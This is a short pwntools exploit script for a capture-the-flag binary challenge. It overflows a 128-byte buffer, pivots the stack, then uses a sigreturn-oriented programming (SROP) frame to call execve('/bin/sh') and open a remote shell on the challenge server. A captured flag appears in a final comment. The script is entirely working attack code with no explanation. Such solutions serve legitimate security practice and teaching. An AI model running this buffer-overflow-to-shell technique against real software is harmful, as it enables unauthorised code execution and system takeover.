from pwn import *
p=process('./chall')
p=remote('chall.v1t.site', 30211)
context.arch='amd64'
payload=b'a'*128+p64(0x404580)+p64(0x401212)
#input()
p.sendafter(b'pond.',payload)
#input()

pop_rax=0x4011ef
syscall=0x4011f1
payload=b'/bin/sh'+b'\x00'*(0x88-7)+p64(pop_rax)+p64(0xf)+p64(syscall)
frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = 0x404500        # /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = syscall
payload += bytes(frame)

p.send(payload)
p.interactive()
#V1T{w4k3c4ll_s1gr3t_8b21799b5ad6fb6faa570fcbf0a0dcf5}
